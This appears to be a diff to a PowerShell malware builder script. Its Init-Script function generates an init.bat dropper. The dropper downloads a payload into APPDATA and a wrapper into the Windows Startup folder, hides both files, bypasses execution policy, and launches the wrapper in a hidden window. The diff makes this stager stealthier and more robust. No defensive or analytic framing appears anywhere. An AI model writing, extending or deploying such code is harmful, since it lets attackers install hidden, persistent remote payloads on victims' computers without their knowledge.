@@ -649,14 +649,17 @@ function Init-Script {
     $payloadPath = Read-Host "Payload path"
     $wrapperName = Read-Host "Wrapper name"
 
-    $psCommand = '$startup=[Environment]::GetFolderPath(''Startup''); ' +
-        "iwr '$payloadLink' -OutFile (Join-Path $env:APPDATA '$payloadPath'); " +
-        "attrib +h (Join-Path $env:APPDATA '$payloadPath'); " +
-        "iwr '$wrapperLink' -OutFile (Join-Path `$startup '$wrapperName'); " +
+    $psCommand = 'try {' +
+        '`$startup=[Environment]::GetFolderPath("Startup"); ' +
+        '`$appdata=[Environment]::GetFolderPath("ApplicationData"); ' +
+        "Invoke-WebRequest '$payloadLink' -OutFile (Join-Path `$appdata '$payloadPath'); " +
+        "attrib +h (Join-Path `$appdata '$payloadPath'); " +
+        "Invoke-WebRequest '$wrapperLink' -OutFile (Join-Path `$startup '$wrapperName'); " +
         "attrib +h (Join-Path `$startup '$wrapperName'); " +
-        "& (Join-Path `$startup '$wrapperName'); exit"
+        "Start-Process -FilePath (Join-Path `$startup '$wrapperName') -WindowStyle Hidden; " +
+        '} catch { Write-Error "Execution failed: $_" }'
 
-    $batchContent = "powershell -NoProfile -Command `"$psCommand`""
+    $batchContent = "powershell -NoProfile -ExecutionPolicy Bypass -Command `"$psCommand`""
 
     Set-Content -Path "init.bat" -Value $batchContent -Encoding ASCII
 
@@ -956,4 +959,5 @@ while (-not $exitRequested) {
             Write-Host "Type 'help' for a list of available commands" -ForegroundColor DarkRed
         }
     }
+
 }
